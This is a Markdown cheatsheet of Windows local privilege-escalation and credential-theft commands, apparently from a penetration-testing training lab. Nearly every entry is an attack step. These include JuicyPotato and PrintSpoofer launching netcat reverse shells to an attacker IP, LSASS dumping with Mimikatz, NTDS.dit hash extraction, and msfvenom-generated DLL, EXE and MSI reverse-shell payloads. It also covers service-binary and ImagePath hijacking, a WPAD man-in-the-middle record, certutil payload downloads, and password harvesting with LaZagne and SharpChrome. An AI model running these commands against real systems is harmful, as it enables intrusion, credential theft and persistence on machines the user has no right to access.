###### Checklists
- [hacktrickz](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

## Table of Contents

- [Initial Enumeration](#Initial\Enumeration)
- [RDP to lab target](#RDP\to\lab\target)
- [Get interface, IP address, and DNS information](#Get\interface,\IP\address,\and\DNS\information)  - [Review ARP table](#Review\ARP\table)
- [Review routing table](#Review\routing\table)
- [Check Windows Defender status](#Check\Windows\Defender\status)
- [List AppLocker rules](#List\AppLocker\rules)
 - [Test AppLocker policy](#Test\AppLocker\policy)
- [Display all environment variables](#Display\all\environment\variables)
 - [View detailed system configuration information](#View\detailed\system\configuration\information)
- [Get patches and updates](#Get\patches\and\updates)
 - [Get installed programs](#Get\installed\programs)
- [Display running processes](#Display\running\processes)
- [Get logged-in users](#Get\logged-in\users)
 - [Get current user](#Get\current\user)
- [View current user privileges](#View\current\user\privileges)
- [View current user group information](#View\current\user\group\information)
 - [Get all system users](#Get\all\system\users)
- [Get all system groups](#Get\all\system\groups)
 - [View details about a group](#View\details\about\a\group)
- [Get password policy](#Get\password\policy)
 - [Display active network connections](#Display\active\network\connections)
- [List named pipes](#List\named\pipes)
 - [List named pipes with PowerShell](#List\named\pipes\with\PowerShell)
- [Review permissions on a named pipe](#Review\permissions\on\a\named\pipe)
- [Handy Commands](#Handy\Commands)
- [Connect using mssqlclient.py](#Connect\using\mssqlclient.py)
- [Enable xp_cmdshell with mssqlclient.py](#Enable\xp_cmdshell\with\mssqlclient.py)
- [Run OS commands with xp_cmdshell](#Run\OS\commands\with\xp_cmdshell)
- [Escalate privileges with JuicyPotato](#Escalate\privileges\with\JuicyPotato)
- [Escalating privileges with PrintSpoofer](#Escalating\privileges\with\PrintSpoofer)
- [Take memory dump with ProcDump](#Take\memory\dump\with\ProcDump)
- [Use MimiKatz to extract credentials from LSASS memory dump](#Use\MimiKatz\to\extract\credentials\from\LSASS\memory\dump)
- [Checking ownership of a file](#Checking\ownership\of\a\file)
- [Taking ownership of a file](#Taking\ownership\of\a\file)
- [Confirming changed ownership of a file](#Confirming\changed\ownership\of\a\file)
- [Modifying a file ACL](#Modifying\a\file\ACL)
- [Extract hashes with secretsdump.py](#Extract\hashes\with\secretsdump.py)
- [Copy files with ROBOCOPY](#Copy\files\with\ROBOCOPY)
- [Searching security event logs](#Searching\security\event\logs)
- [Passing credentials to wevtutil](#Passing\credentials\to\wevtutil)
- [Searching event logs with PowerShell](#Searching\event\logs\with\PowerShell)
- [Generate malicious DLL](#Generate\malicious\DLL)
- [Loading a custom DLL with dnscmd](#Loading\a\custom\DLL\with\dnscmd)
- [Finding a user's SID](#Finding\a\user's\SID)
- [Checking permissions on DNS service](#Checking\permissions\on\DNS\service)
 - [Stopping a service](#Stopping\a\service)
- [Starting a service](#Starting\a\service)
- [Querying a registry key](#Querying\a\registry\key)
 - [Deleting a registry key](#Deleting\a\registry\key)
 - [Checking a service status](#Checking\a\service\status)
 - [Disabling the global query block list](#Disabling\the\global\query\block\list)
- [Adding a WPAD record](#Adding\a\WPAD\record)
- [Compile with cl.exe](#Compile\with\cl.exe)
- [Add reference to a driver (1)](#Add\reference\to\a\driver\(1))
- [Add reference to a driver (2)](#Add\reference\to\a\driver\(2))
 - [Check if driver is loaded](#Check\if\driver\is\loaded)
 - [Using EopLoadDriver](#Using\EopLoadDriver)
 - [Checking service permissions with PsService](#Checking\service\permissions\with\PsService)
 - [Modifying a service binary path](#Modifying\a\service\binary\path)
- [Confirming UAC is enabled](#Confirming\UAC\is\enabled)
 - [Checking UAC level](#Checking\UAC\level)
 - [Checking Windows version](#Checking\Windows\version)
 - [Reviewing path variable](#Reviewing\path\variable)
 - [Downloading file with cURL in PowerShell](#Downloading\file\with\cURL\in\PowerShell)
 - [Executing custom DLL with rundll32.exe](#Executing\custom\DLL\with\rundll32.exe)
 - [Running SharpUp](#Running\SharpUp)
- [Checking service permissions with icacls](#Checking\service\permissions\with\icacls)
 - [Replace a service binary](#Replace\a\service\binary)
- [Searching for unquoted service paths](#Searching\for\unquoted\service\paths)
  - [Checking for weak service ACLs in the Registry](#Checking\for\weak\service\ACLs\in\the\Registry)
 - [Changing ImagePath with PowerShell](#Changing\ImagePath\with\PowerShell)
 - [Check startup programs](#Check\startup\programs)
 - [Generating a malicious binary](#Generating\a\malicious\binary)
- [Enumerating a process ID with PowerShell](#Enumerating\a\process\ID\with\PowerShell)
 - [Enumerate a running service by name with PowerShell](#Enumerate\a\running\service\by\name\with\PowerShell)
- [Credential Theft](#Credential\Theft)
- [Search for files with the phrase "password"](#Search\for\files\with\the\phrase\"password")
- [Searching for passwords in Chrome dictionary files](#Searching\for\passwords\in\Chrome\dictionary\files)
- [Confirm PowerShell history save path](#Confirm\PowerShell\history\save\path)
- [Reading PowerShell history file](#Reading\PowerShell\history\file)
- [Decrypting PowerShell credentials](#Decrypting\PowerShell\credentials)
- [Searching file contents for a string](#Searching\file\contents\for\a\string)
- [Search file contents with PowerShell](#Search\file\contents\with\PowerShell)
- [Search for file extensions](#Search\for\file\extensions)
- [Search for file extensions using PowerShell](#Search\for\file\extensions\using\PowerShell)
- [List saved credentials](#List\saved\credentials)
- [Retrieve saved Chrome credentials](#Retrieve\saved\Chrome\credentials)
- [View LaZagne help menu](#View\LaZagne\help\menu)
- [Run all LaZagne modules](#Run\all\LaZagne\modules)
- [Running SessionGopher](#Running\SessionGopher)
- [View saved wireless networks](#View\saved\wireless\networks)
- [Retrieve saved wireless passwords](#Retrieve\saved\wireless\passwords)
- [Other Commands](#Other\Commands)
- [Transfer file with certutil](#Transfer\file\with\certutil)
- [Encode file with certutil](#Encode\file\with\certutil)
- [Decode file with certutil](#Decode\file\with\certutil)
- [Query for always install elevated registry key (1)](#Query\for\always\install\elevated\registry\key\(1))
- [Query for always install elevated registry key (2)](#Query\for\always\install\elevated\registry\key\(2))
 - [Generate a malicious MSI package](#Generate\a\malicious\MSI\package)
- [Executing an MSI package from command line](#Executing\an\MSI\package\from\command\line)
- [Enumerate scheduled tasks](#Enumerate\scheduled\tasks)
- [Enumerate scheduled tasks with PowerShell](#Enumerate\scheduled\tasks\with\PowerShell)
- [Check permissions on a directory](#Check\permissions\on\a\directory)
- [Check local user description field](#Check\local\user\description\field)
- [Enumerate computer description field](#Enumerate\computer\description\field)
- [Mount VMDK on Linux](#Mount\VMDK\on\Linux)
- [Mount VHD/VHDX on Linux](#Mount\VHD/VHDX\on\Linux)
- [Update Windows Exploit Suggester database](#Update\Windows\Exploit\Suggester\database)
- [Running Windows Exploit Suggester](#Running\Windows\Exploit\Suggester)

Let's convert the entire cheatsheet into the specified Markdown format, ensuring clarity and ease of use.

### Initial Enumeration
#### RDP to lab target
```cmd
xfreerdp /v:<target ip> /u:htb-student
```
- Establishes a Remote Desktop Protocol session to the specified target.

#### Get interface, IP address, and DNS information
```cmd
ipconfig /all
```
- Displays detailed information about the network interfaces, including IP addresses and DNS servers.

#### Review ARP table
```cmd
arp -a
```
- Shows the current Address Resolution Protocol table, mapping IPs to MAC addresses.

#### Review routing table
```cmd
route print
```
- Lists the routing table, showing how packets get routed through the network.

#### Check Windows Defender status
```powershell
Get-MpComputerStatus
```
- Retrieves the current status and configuration of Windows Defender antivirus.

#### List AppLocker rules
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
- Displays the effective AppLocker rules that are currently applied on the system.

#### Test AppLocker policy
```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
- Tests whether a specific file (here, `cmd.exe`) can be run by a user under the current AppLocker policy.

#### Display all environment variables
```cmd
set
```
- Lists all the environment variables set in the current session.

#### View detailed system configuration information
```cmd
systeminfo
```
- Provides comprehensive details about the system's hardware and OS configuration.

#### Get patches and updates
```cmd
wmic qfe
```
- Lists all the patches and updates installed on the system.

#### Get installed programs
```cmd
wmic product get name
```
- Displays the names of all installed programs.

#### Display running processes
```cmd
tasklist /svc
```
- Lists current running processes and the services associated with them.

#### Get logged-in users
```cmd
query user
```
- Shows users currently logged into the system.

#### Get current user
```cmd
echo %USERNAME%
```
- Displays the username of the current user.

#### View current user privileges
```cmd
whoami /priv
```
- Lists the security privileges of the current user account.

#### View current user group information
```cmd
whoami /groups
```
- Shows all the user groups the current user is a part of.

#### Get all system users
```cmd
net user
```
- Lists all user accounts on the system.

#### Get all system groups
```cmd
net localgroup
```
- Displays all local groups on the system.

#### View details about a group
```cmd
net localgroup administrators
```
- Lists members of the specified group, here showing the `administrators` group.

#### Get password policy
```cmd
net accounts
```
- Shows the system's password policy settings.

#### Display active network connections
```cmd
netstat -ano
```
- Lists all active connections and listening ports along with the PID of each process.

#### List named pipes
```cmd
pipelist.exe /accepteula
```
- Displays all named pipes on the system, requiring acceptance of the EULA on first run.

#### List named pipes with PowerShell
```powershell
gci \\.\pipe\
```
- Gets a list of named pipes available on the system using PowerShell.

#### Review permissions on a named pipe
```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
- Checks the permissions of a specific named pipe, here checking `lsass`, with verbose output.

### Handy Commands
#### Connect using mssqlclient.py
```cmd
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
- Establishes a connection to an MS SQL server using Windows authentication.

#### Enable xp_cmdshell with mssqlclient.py
```cmd
enable_xp_cmdshell
```
- Enables the `xp_cmdshell` feature within an SQL server session, allowing command execution.

#### Run OS commands with xp_cmdshell
```cmd
xp_cmdshell whoami
```
- Executes a command shell command (`whoami`) via `xp_cmdshell`.

#### Escalate privileges with JuicyPotato
```cmd
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
```
- Uses `JuicyPotato` for privilege escalation by abusing token impersonation.

#### Escalating privileges with PrintSpoofer
```cmd
c:\tools\PrintSpoofer.exe

 -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
- Leverages `PrintSpoofer` to escalate privileges by exploiting the Print Spooler service.

#### Take memory dump with ProcDump
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
- Creates a memory dump of the `lsass.exe` process, potentially containing credentials.

#### Use MimiKatz to extract credentials from LSASS memory dump
```cmd
sekurlsa::minidump lsass.dmp and sekurlsa::logonpasswords
```
- Processes an `lsass.exe` memory dump with `Mimikatz` to extract plaintext passwords and hashes.

#### Checking ownership of a file
```cmd
dir /q C:\backups\wwwroot\web.config
```
- Displays the owner of the specified file.

#### Taking ownership of a file
```cmd
takeown /f C:\backups\wwwroot\web.config
```
- Takes ownership of the specified file, allowing for further actions like editing or deletion.

#### Confirming changed ownership of a file
```powershell
Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ | select name,directory, @{Name=“Owner”;Expression={(Get-ACL $_.Fullname).Owner}}
```
- Confirms the owner of the file has been changed, using PowerShell for detailed output.

#### Modifying a file ACL
```cmd
icacls “C:\backups\wwwroot\web.config” /grant htb-student:F
```
- Grants full control permissions to the specified user on the file.

#### Extract hashes with secretsdump.py
```cmd
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
- Dumps the NTDS.dit file hashes using the SYSTEM registry hive for decryption.

#### Copy files with ROBOCOPY
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
- Uses `ROBOCOPY` to copy the `NTDS.dit` file, often part of a domain controller's state information.

#### Searching security event logs
```cmd
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
- Queries the security event logs for entries containing `/user`, providing insights into user activities.

#### Passing credentials to wevtutil
```cmd
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
- Executes a remote query against security logs on `share01` using specified credentials, filtering for `/user`.

#### Searching event logs with PowerShell
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
- Filters security logs for events with ID 4688, where command lines include `/user`, utilizing PowerShell for parsing.

#### Generate malicious DLL
```cmd
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
- Creates a DLL payload that adds a user to the domain admins group, for use in DLL hijacking or side-loading attacks.

#### Loading a custom DLL with dnscmd
```cmd
dnscmd.exe /config /serverlevelplugindll adduser.dll
```
- Configures the DNS server to load a custom plugin DLL, potentially for persistence or privilege escalation.

#### Finding a user's SID
```cmd
wmic useraccount where name="netadm" get sid
```
- Retrieves the Security Identifier (SID) for the specified user account.

#### Checking permissions on DNS service
```cmd
sc.exe sdshow DNS
```
- Shows the security descriptor for the DNS service, indicating who has permissions to manage it.

#### Stopping a service
```cmd
sc stop dns
```
- Stops the DNS service, potentially as part of a service disruption attack or to replace a service binary.

#### Starting a service
```cmd
sc start dns
```
- Starts the DNS service, useful after maintenance or exploitation activities.

#### Querying a registry key
```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
- Queries a specific registry key, potentially to check for misconfigurations or malicious entries.

#### Deleting a registry key
```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\Current

ControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```
- Removes a registry value, here aiming to eliminate a custom DNS server plugin configuration.

#### Checking a service status
```cmd
sc query dns
```
- Queries the current status of the DNS service, indicating whether it is running, stopped, or in another state.

#### Disabling the global query block list
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
- Disables the DNS Server Global Query Block List, potentially to allow WPAD and ISATAP name resolution.

#### Adding a WPAD record
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
- Adds an A record for WPAD in the specified DNS zone, facilitating a man-in-the-middle (MitM) attack.

#### Compile with cl.exe
```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
- Compiles a C++ source file, specifying Unicode definitions, potentially for privilege escalation exploits.

#### Add reference to a driver (1)
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
- Adds a registry key to specify the path to a driver, part of loading a vulnerable or malicious driver.

#### Add reference to a driver (2)
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
- Adds a registry key to define the type of a driver, aiding in its configuration or exploitation.

#### Check if driver is loaded
```cmd
.\DriverView.exe /stext drivers.txt and cat drivers.txt | Select-String -pattern Capcom
```
- Uses `DriverView` to list loaded drivers, then filters the output for a specific pattern, here `Capcom`, to verify if a driver is loaded.

#### Using EopLoadDriver
```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
- Loads a driver into the system for elevation of privilege exploits, using a utility designed for this purpose.

#### Checking service permissions with PsService
```cmd
c:\Tools\PsService.exe security AppReadiness
```
- Checks the security permissions of the `AppReadiness` service, identifying potential vulnerabilities.

#### Modifying a service binary path
```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
- Changes the binary path of a service, here to add a user to the Administrators group when the service starts.

#### Confirming UAC is enabled
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
- Queries the registry to check if User Account Control (UAC) is enabled, impacting exploitation strategies.

#### Checking UAC level
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
- Determines the configuration level of UAC prompts for administrators, affecting how elevation of privilege might be pursued.

#### Checking Windows version
```powershell
[environment]::OSVersion.Version
```
- Retrieves the operating system version, assisting in identifying applicable vulnerabilities.

#### Reviewing path variable
```cmd
cmd /c echo %PATH%
```
- Displays the contents of the `PATH` environment variable, which can reveal the locations of executables and scripts.

#### Downloading file with cURL in PowerShell
```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```
- Uses `curl` to download a file, here a DLL, into a specific directory, potentially for side-loading or DLL hijacking.

#### Executing custom DLL with rundll32.exe
```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
- Executes a specified DLL file using `rundll32`, a method often used in persistence or malware loading techniques.

#### Running SharpUp
```cmd
.\SharpUp.exe audit
```
- Executes `SharpUp`, a privilege escalation enumeration tool that checks for common Windows misconfigurations.

#### Checking service permissions with icacls
```cmd
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
- Uses

 `icacls` to review the permissions of a specific service executable, identifying potential for unauthorized modification.

#### Replace a service binary
```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
- Copies a new executable over a service binary, a technique used for maintaining persistence or escalating privileges.

#### Searching for unquoted service paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
- Identifies services with unquoted paths that contain spaces, which can be exploited to execute arbitrary code.

#### Checking for weak service ACLs in the Registry
```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
- Utilizes `accesschk` to evaluate the Access Control Lists (ACLs) of services in the registry for weak permissions.

#### Changing ImagePath with PowerShell
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
- Modifies the `ImagePath` of a service to run a different executable, here setting it to initiate a reverse shell.

#### Check startup programs
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
- Lists programs that run at startup, potentially revealing persistence mechanisms or opportunities for exploitation.

#### Generating a malicious binary
```cmd
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
- Creates an executable with a reverse Meterpreter payload, aimed at establishing a covert, encrypted backdoor.

#### Enumerating a process ID with PowerShell
```powershell
get-process -Id 3324
```
- Retrieves details about a process with a specific Process ID (PID), aiding in process investigation and management.

#### Enumerate a running service by name with PowerShell
```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```
- Lists services with names matching a specific pattern, useful for identifying target services for analysis or exploitation.

### Credential Theft
#### Search for files with the phrase "password"
```cmd
findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml
```
- Searches for files containing the word "password," potentially uncovering credentials stored in plaintext.

#### Searching for passwords in Chrome dictionary files
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
- Reads a Chrome dictionary file, looking for occurrences of "password," which might reveal user-specified sensitive words.

#### Confirm PowerShell history save path
```powershell
(Get-PSReadLineOption).HistorySavePath
```
- Retrieves the file path where PowerShell command history is saved, a potential source of sensitive command usage information.

#### Reading PowerShell history file
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```
- Reads the content of the PowerShell history file, potentially exposing previously executed commands and scripts.

#### Decrypting PowerShell credentials
```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```
- Decrypts and imports credentials saved in a Clixml file, which PowerShell uses to securely store objects.

#### Searching file contents for a string
```cmd
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```
- Searches for the presence of "password" within files of specified types, potentially revealing sensitive information.

#### Search file contents with PowerShell
```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
- Utilizes PowerShell to search within text files for the word "password," aiding in sensitive data discovery.

#### Search for file extensions
```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```
- Looks for files with names suggesting they might contain credentials, across various common formats.

#### Search for file extensions using PowerShell
```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```
- Uses PowerShell to recursively search for files with extensions likely to

 contain sensitive configurations or credentials.

#### List saved credentials
```cmd
cmdkey /list
```
- Displays all credentials stored in the Windows Credential Manager, a potential treasure trove for attackers.

#### Retrieve saved Chrome credentials
```cmd
.\SharpChrome.exe logins /unprotect
```
- Uses `SharpChrome` to extract and display saved Chrome credentials, decrypting them if necessary.

#### View LaZagne help menu
```cmd
.\lazagne.exe -h
```
- Shows the help menu for `LaZagne`, a tool for extracting stored passwords from a variety of applications.

#### Run all LaZagne modules
```cmd
.\lazagne.exe all
```
- Executes `LaZagne` to attempt extraction of credentials across all its supported applications and services.

#### Running SessionGopher
```powershell
Invoke-SessionGopher -Target WINLPE-SRV01
```
- Executes `SessionGopher`, a PowerShell tool for extracting saved session information from various applications, targeting a specific machine.

#### View saved wireless networks
```cmd
netsh wlan show profile
```
- Lists profiles for wireless networks previously connected to, which may include networks of interest or targets for further attacks.

#### Retrieve saved wireless passwords
```cmd
netsh wlan show profile ilfreight_corp key=clear
```
- Displays the plaintext password for a specified wireless network profile, revealing credentials for network access.

### Other Commands
#### Transfer file with certutil
```cmd
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```
- Utilizes `certutil` to download a file from a remote server, bypassing some forms of network monitoring and defenses.

#### Encode file with certutil
```cmd
certutil -encode file1 encodedfile
```
- Encodes a file into a base64 format using `certutil`, potentially for obfuscation or data exfiltration purposes.

#### Decode file with certutil
```cmd
certutil -decode encodedfile file2
```
- Decodes a previously encoded file, restoring it to its original state.

#### Query for always install elevated registry key (1)
```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
- Checks for the presence of the `AlwaysInstallElevated` registry key under the current user, indicating that MSI files run with elevated privileges.

#### Query for always install elevated registry key (2)
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
- Checks for the `AlwaysInstallElevated` policy at the system level, which if enabled, allows all users to install MSI packages with administrative rights.

#### Generate a malicious MSI package
```cmd
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```
- Creates an MSI package containing a reverse shell payload, which if executed, opens a remote shell to the attacker's machine.

#### Executing an MSI package from command line
```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```
- Silently installs an MSI package without user interaction or system restart, useful for stealthy deployments of tools or payloads.

#### Enumerate scheduled tasks
```cmd
schtasks /query /fo LIST /v
```
- Lists all scheduled tasks in a verbose list format, providing insights into potential vectors for persistence or privilege escalation.

#### Enumerate scheduled tasks with PowerShell
```powershell
Get-ScheduledTask | select TaskName,State
```
- Retrieves scheduled tasks using PowerShell, offering a cleaner, more scriptable interface for enumeration.

#### Check permissions on a directory
```cmd
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```
- Uses `accesschk` to assess the permissions of a directory, useful for finding writable locations or misconfigurations.

#### Check local user description field
```powershell
Get-LocalUser
```
- Lists local user accounts, including the description field which may contain sensitive information or hints about the account's purpose.

#### Enumerate computer description field
```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```
- Extracts the description of the operating system, potentially revealing custom configurations or identifying information.

#### Mount VMDK on Linux
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd
```
- Attaches a VMDK disk image to a mount point on Linux, allowing read-only access to its filesystem.

#### Mount VHD/VHDX on Linux
```bash
guestmount --add WEBSRV10.v

hdx --ro /mnt/vhdx/ -m /dev/sda1
```
- Mounts a VHDX image, providing read-only access to its first partition, useful for forensic analysis or data extraction.

#### Update Windows Exploit Suggester database
```bash
sudo python2.7 windows-exploit-suggester.py --update
```
- Updates the local database for `Windows Exploit Suggester`, preparing it for accurate vulnerability scanning.

#### Running Windows Exploit Suggester
```bash
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```
- Scans a system information file against the `Windows Exploit Suggester` database to identify applicable vulnerabilities.